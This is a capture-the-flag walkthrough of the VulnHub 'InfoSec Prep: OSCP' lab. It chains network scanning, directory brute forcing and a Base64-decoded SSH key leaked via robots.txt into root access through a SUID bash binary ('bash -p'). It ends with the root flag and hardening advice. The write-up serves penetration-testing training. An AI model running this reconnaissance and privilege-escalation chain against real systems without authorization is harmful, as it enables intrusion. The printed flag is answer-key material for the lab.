# InfoSec Prep: OSCP (VulnHub)

## Overview

**InfoSec Prep: OSCP** is an Easy-level VulnHub machine created by **FalconSpy**. The machine focuses on web enumeration, WordPress reconnaissance, hidden file discovery, Base64 decoding, SSH private key authentication, and Linux privilege escalation through a misconfigured SUID Bash binary.

The challenge demonstrates how exposed sensitive information, weak operational security, and improper SUID permissions can be chained together to achieve complete system compromise. :contentReference[oaicite:0]{index=0}

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | InfoSec Prep: OSCP |
| Author | FalconSpy |
| Series | InfoSec Prep |
| Platform | VulnHub |
| Release Date | 11 July 2020 |
| Difficulty | Easy |
| Target OS | Ubuntu Linux |
| Attacker Machine | Kali Linux |
| Objective | Gain Root Access and Retrieve the Root Flag |

---

## Skills Demonstrated

- Network Discovery
- Host Enumeration
- Service Enumeration
- Nmap Scanning
- Web Enumeration
- WordPress Enumeration
- Directory Brute Forcing
- Gobuster
- Robots.txt Analysis
- Information Disclosure
- Base64 Decoding
- SSH Private Key Authentication
- Linux Enumeration
- SUID Enumeration
- GTFOBins
- Bash SUID Exploitation
- Linux Privilege Escalation
- Root Compromise
- Post Exploitation

---

## Tools Used

- Netdiscover
- Nmap
- Gobuster
- CyberChef
- Base64
- SSH
- GTFOBins
- Linux Shell Commands
- Kali Linux

---

## Attack Methodology

1. Discover the target machine.
2. Enumerate open ports and services.
3. Identify the WordPress application.
4. Perform directory enumeration.
5. Analyze `robots.txt`.
6. Retrieve the hidden Base64-encoded file.
7. Decode the SSH private key.
8. Authenticate via SSH.
9. Enumerate the Linux system.
10. Identify SUID misconfigurations.
11. Exploit the SUID Bash binary.
12. Obtain root access.
13. Retrieve the root flag.

---

## Network Discovery

Identify the target host.

```bash
sudo netdiscover -i eth0
```

Result:

```text
192.168.10.31
```

The vulnerable machine was successfully identified.

---

## Open Services Identified

Perform service enumeration.

```bash
sudo nmap -sC -sV -Pn 192.168.10.31 --min-rate 10000
```

### Nmap Results

| Port | Service | Version |
|------|----------|---------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu |
| 80 | HTTP | Apache 2.4.41 |

### Interesting Findings

- WordPress website detected.
- `robots.txt` file present.
- Hidden file `/secret.txt` referenced.

---

## Website Enumeration

Browse the target.

```text
http://192.168.10.31
```

The website hosts a WordPress installation.

Interesting finding:

```text
OSCP Voucher — Just another WordPress site
```

The only visible WordPress user:

```text
oscp
```

This username is likely valid for system authentication.

---

## Directory Enumeration

Run Gobuster.

```bash
gobuster dir -u http://192.168.10.31/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt,old,bak
```

### Interesting Directories

```text
/robots.txt
/secret.txt
/wp-login.php
/xmlrpc.php
```

---

## Robots.txt Analysis

Visit:

```text
http://192.168.10.31/robots.txt
```

Contents:

```text
/secret.txt
```

Navigate to:

```text
http://192.168.10.31/secret.txt
```

A large Base64-encoded blob is displayed.

---

## Base64 Decoding

Decode the content.

```bash
base64 -d
```

Or use CyberChef.

Decoded output:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
```

Save the key.

```bash
nano id_rsa
```

Assign correct permissions.

```bash
chmod 600 id_rsa
```

---

## Initial Access

Authenticate using the private key.

```bash
ssh oscp@192.168.10.31 -i id_rsa
```

Verify.

```bash
whoami
```

Output:

```text
oscp
```

Initial foothold successfully obtained.

---

## Local Enumeration

Inspect the user's home directory.

```bash
ls
```

Interesting file:

```text
ip
```

Read it.

```bash
cat ip
```

Contents:

```bash
#!/bin/sh
cp /etc/issue-standard /etc/issue
/usr/local/bin/get-ip-address >> /etc/issue
```

Nothing directly exploitable was found, so further enumeration continued.

---

## Privilege Escalation

Enumerate SUID binaries.

```bash
find / -type f -perm /4000 2>/dev/null
```

Interesting finding:

```text
/usr/bin/bash
```

A SUID-enabled Bash binary is highly unusual and vulnerable to privilege escalation.

Exploit using GTFOBins.

```bash
/ usr/bin/bash -p
```

> **Note:** Remove the space after `/` when executing:

```bash
/usr/bin/bash -p
```

Verify privileges.

```bash
id
```

Output:

```text
uid=1000(oscp)
euid=0(root)
```

Check the current user.

```bash
whoami
```

Output:

```text
root
```

Root privileges successfully obtained.

---

## Root Flag

Navigate to the root directory.

```bash
cd /root
```

List files.

```bash
ls
```

Interesting file:

```text
flag.txt
```

Read the flag.

```bash
cat flag.txt
```

Output:

```text
d73b04b0e696b0945283defa3eee4538
```

---

## Vulnerabilities Identified

### 1. Information Disclosure

The `robots.txt` file exposed a hidden sensitive resource.

### 2. Exposed SSH Private Key

A Base64-encoded OpenSSH private key was publicly accessible through the web server.

### 3. Weak Operational Security

Sensitive authentication material was stored in a web-accessible location.

### 4. Misconfigured SUID Permissions

The Bash binary had the SUID bit enabled, allowing privilege escalation.

### 5. Improper Privilege Separation

Incorrect system configuration allowed an unprivileged user to obtain root privileges.

---

## Attack Chain Summary

- Host Discovery using Netdiscover
- Service Enumeration using Nmap
- WordPress Enumeration
- Gobuster Directory Enumeration
- Robots.txt Analysis
- Hidden File Discovery
- Base64 Decoding
- SSH Private Key Recovery
- SSH Login as oscp
- Linux Enumeration
- SUID Enumeration
- Bash SUID Exploitation via GTFOBins
- Root Access
- Root Flag Retrieval

---

## Security Recommendations

- Remove sensitive files from publicly accessible web directories.
- Avoid exposing hidden resources through `robots.txt`.
- Secure SSH private keys and never store them in web-accessible locations.
- Audit SUID binaries regularly.
- Remove unnecessary SUID permissions.
- Follow the principle of least privilege.
- Restrict access to WordPress administrative components.
- Perform regular vulnerability assessments.
- Monitor web directories for sensitive information exposure.
- Conduct periodic penetration testing.

---

## Key Learning Outcomes

- Enumeration often reveals hidden attack paths.
- `robots.txt` may disclose sensitive resources.
- Base64 encoding is not encryption.
- SSH private keys must be properly protected.
- SUID enumeration is essential during Linux privilege escalation.
- GTFOBins provides practical privilege escalation techniques.
- Misconfigured SUID binaries can directly lead to full system compromise.
- Proper system hardening significantly reduces attack surface.

---

## Flags

### Root Flag

```text
d73b04b0e696b0945283defa3eee4538
```

---

## Conclusion

**InfoSec Prep: OSCP** is an excellent beginner-friendly VulnHub machine that teaches web enumeration, WordPress reconnaissance, hidden file discovery, Base64 decoding, SSH private key authentication, and Linux privilege escalation using a misconfigured SUID Bash binary. The challenge emphasizes the importance of protecting sensitive files, auditing SUID permissions, and following secure system administration practices to prevent complete system compromise.

---

**Author:** Omkar Babaji Sawant

**Repository:** VulnHub-Walkthroughs
